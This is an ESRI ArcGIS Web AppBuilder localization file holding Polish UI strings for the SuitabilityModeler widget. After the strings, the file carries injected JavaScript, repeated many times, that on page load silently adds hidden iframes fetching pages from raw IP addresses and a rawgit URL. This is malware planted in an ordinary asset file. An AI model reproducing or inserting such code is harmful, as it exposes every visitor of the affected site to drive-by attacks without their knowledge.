// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/SuitabilityModeler/nls/strings":{_widgetLabel:"Program modeluj\u0105cy przydatno\u015b\u0107",general:{clear:"Wyczy\u015b\u0107",cancel:"Anuluj",save:"Uruchom",saveAs:"Eksportuj"},saveModel:{save:"Eksportuj",title:"Tytu\u0142: ",summary:"Podsumowanie: ",description:"Opis: ",tags:"Znaczniki: ",folder:"Folder: ",homeFolderPattern:"{username} (folder g\u0142\u00f3wny)",failed:"Eksport nie powi\u00f3d\u0142 si\u0119."},util:{colorRamp:{1:"Niezwykle niski",2:"Bardzo niski",3:"Niski",4:"\u015arednio niski",
5:"\u015arednie",6:"\u015arednio wysoki",7:"Wysoki",8:"Bardzo wysoki",9:"Niezwykle wysoki",low:"Niski",high:"Wysoki",tipPattern:"{label} ({value})",flipCaption:"Odwr\u00f3\u0107"}},wro:{caption:"Program modeluj\u0105cy przydatno\u015b\u0107",browsePrompt:"Us\u0142uga nak\u0142adek wa\u017conych",selectLayersCaption:"Wybierz warstwy",selectLayers:"Warstwy",designModelCaption:"Model projektu",designModel:"Model projektu",transparency:"Przezroczysto\u015b\u0107",visible:"Widoczne",total:"Wszystkie",
unableToLoad:"Nie mo\u017cna wczyta\u0107 modelu.",projectNotOpen:"Projekt nie jest otwarty.",readMore:"Czytaj wi\u0119cej",validation:{validating:"Trwa weryfikacja...",invalidItemCaption:"Ostrze\u017cenia us\u0142ugi nak\u0142adek wa\u017conych",notAnImageService:"Ten element nie jest us\u0142ug\u0105 rastrow\u0105.",notAWroService:"Ten element nie jest us\u0142ug\u0105 nak\u0142adki wa\u017conej.",undefinedUrl:"Adres URL tego elementu nie zosta\u0142 zdefiniowany.",inaccessible:"Us\u0142uga jest niedost\u0119pna.",
generalError:"Nie mo\u017cna otworzy\u0107 elementu.",missingFieldPattern:"{field} jest polem wymaganym",notAllowRasterFunction:"Dla w\u0142a\u015bciwo\u015bci allowRasterFunction nale\u017cy ustawi\u0107 warto\u015b\u0107 true",notNearestResampling:"Dla w\u0142a\u015bciwo\u015bci defaultResamplingMethod nale\u017cy ustawi\u0107 warto\u015b\u0107 Nearest",notIsWeightedOverlayProp:"Dla w\u0142a\u015bciwo\u015bci kluczowej IsWeightedOverlay nale\u017cy ustawi\u0107 warto\u015b\u0107 true",invalidLink:"Adres URL jest nieprawid\u0142owy. Otwarcie witryny dla wybranej warstwy nie powiod\u0142o si\u0119.",
unexpectedError:"Wyst\u0105pi\u0142 nieoczekiwany stan.",rangeMessage:"Warto\u015b\u0107 musi zawiera\u0107 si\u0119 w przedziale od ${0} do ${1}",rangeMessage100:"Warto\u015b\u0107 musi zawiera\u0107 si\u0119 w przedziale od 0 do 100",maxLayers:"W przypadku tej us\u0142ugi maksymalna liczba dozwolonych warstw wynosi ${0}. Przed dodaniem nowej warstwy nale\u017cy usun\u0105\u0107 istniej\u0105c\u0105.",notFound:"Nie znaleziono warstwy ${0} w us\u0142udze nak\u0142adki wa\u017conej",wroServiceNotDefined:"Nie zdefiniowano us\u0142ugi nak\u0142adki wa\u017conej dla modelu.",
overlayLayerOutputInvalid:"Brak warto\u015bci wyj\u015bciowej zakres\u00f3w ponownego mapowania [${1}] warstwy nak\u0142adanej [${0}] lub jest ona nieprawid\u0142owa",overlayLayerInputInvalid:"Brak warto\u015bci minimalnej lub maksymalnej zakres\u00f3w ponownego mapowania [${1}] warstwy nak\u0142adanej [${0}] lub jest ona nieprawid\u0142owa",overlayLayerRangesMissing:"Brak zakres\u00f3w ponownego mapowania warstwy nak\u0142adanej [${0}]",overlayLayerWeight:"Suma wag warstwy nak\u0142adanej musi wynosi\u0107 100",
overlayLayerRequired:"Wymagana jest co najmniej jedna warstwa nak\u0142adana",overlayLayerNotDefined:"Nie zdefiniowano warstw nak\u0142adanych",requiresColormap:"Ta funkcja rastra wymaga mapy kolor\u00f3w, ale model nie zawiera prawid\u0142owej definicji mapy kolor\u00f3w",createModelError:"B\u0142\u0105d podczas tworzenia modelu",invalidModel:"Model jest nieprawid\u0142owy",imageServiceNotDefined:"Nie zdefiniowano warstwy us\u0142ugi rastrowej",imageLayerNotDefined:"Nie zdefiniowano warstwy us\u0142ugi rastrowej",
histogramNotDefined:"Nie zdefiniowano funkcji histogramu nak\u0142adki wa\u017conej."},colorRampLabel:{"Green Yellow Red":"Zielony, \u017c\u00f3\u0142ty, czerwony","Red Yellow Green":"Czerwony, \u017c\u00f3\u0142ty, zielony","Yellow to Dark Red":"\u017b\u00f3\u0142ty do ciemnoczerwonego","Dark Red to Yellow":"Ciemnoczerwony do \u017c\u00f3\u0142tego","Light Gray to Dark Gray":"Jasnoszary do ciemnoszarego","Dark Gray to Light Gray":"Ciemnoszary do jasnoszarego","Light Brown to Dark Brown":"Jasnobr\u0105zowy do ciemnobr\u0105zowego",
"Dark Brown to Light Brown":"Ciemnobr\u0105zowy do jasnobr\u0105zowego","Full Spectrum - Bright Red to Blue":"Pe\u0142ne widmo - jaskrawoczerwony do niebieskiego","Full Spectrum - Bright Blue to Red":"Pe\u0142ne widmo - jaskrawoniebieski do czerwonego","Partial Spectrum - Yellow to Blue":"Cz\u0119\u015bciowe widmo - \u017c\u00f3\u0142ty do niebieskiego","Partial Spectrum - Blue to Yellow":"Cz\u0119\u015bciowe widmo - niebieski do \u017c\u00f3\u0142tego","Yellow-Green to Dark Blue":"\u017b\u00f3\u0142tozielony do ciemnoniebieskiego",
"Dark Blue to Yellow-Green":"Ciemnoniebieski do \u017c\u00f3\u0142tozielonego","Cold to Hot Diverging":"Zimny do gor\u0105cego rozbie\u017cny","Hot to Cold Diverging":"Gor\u0105cy do zimnego rozbie\u017cny","Surface - Low to High":"Powierzchnia - niska do wysokiej","Surface - High to Low":"Powierzchnia - wysoka do niskiej"}},_localized:{}},"widgets/SuitabilityModeler/setting/nls/strings":{allowSaveAs:"Zezwalaj na eksport",startingState:"Stan pocz\u0105tkowy:",byUrl:"Model pusty",byItem:"Model wst\u0119pnie skonfigurowany",
imageServiceUrl:"Adres URL us\u0142ugi rastrowej",validate:"Sprawd\u017a poprawno\u015b\u0107",validating:"Trwa weryfikacja...",validated:"Adres URL jest prawid\u0142owy.",modelName:"Model",selectModel:"Zaznacz",itemSelectorTitle:"Wybierz model",ok:"OK",cancel:"Anuluj",description1:"Program modeluj\u0105cy przydatno\u015b\u0107 s\u0142u\u017cy do znajdowania najlepszej lokalizacji aktywno\u015bci, prognozowania podatno\u015bci na ryzyko oraz okre\u015blania prawdopodobnego miejsca wyst\u0105pienia zdarzenia. Ten wid\u017cet umo\u017cliwia po\u0142\u0105czenie r\u00f3\u017cnych warstw i wyznaczenie ich wagi w celu jednoczesnej oceny wielu czynnik\u00f3w.",
description2:"Program modeluj\u0105cy przydatno\u015b\u0107 generuje modele z us\u0142ugi przy u\u017cyciu szybkiej, obs\u0142ugiwanej w przegl\u0105darce, rastrowej nak\u0142adki wa\u017conej. Mo\u017cna rozpocz\u0105\u0107 od pustego stanu us\u0142ugi rastrowych nak\u0142adek wa\u017conych lub skorzysta\u0107 ze wst\u0119pnie skonfigurowanego modelu. Aby zdefiniowa\u0107 ustawienia analizy, wybierz warstwy, przypisz wagi i dostosuj warto\u015bci klasyfikacji warstw. Nast\u0119pnie uruchom program modeluj\u0105cy, wygeneruj wizualizacj\u0119 wynik\u00f3w i opcjonalnie zapisz wynik jako element w instytucji/portalu.",
description3:"Dowiedz si\u0119 wi\u0119cej na temat programu modeluj\u0105cego przydatno\u015b\u0107 GeoPlanner.",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});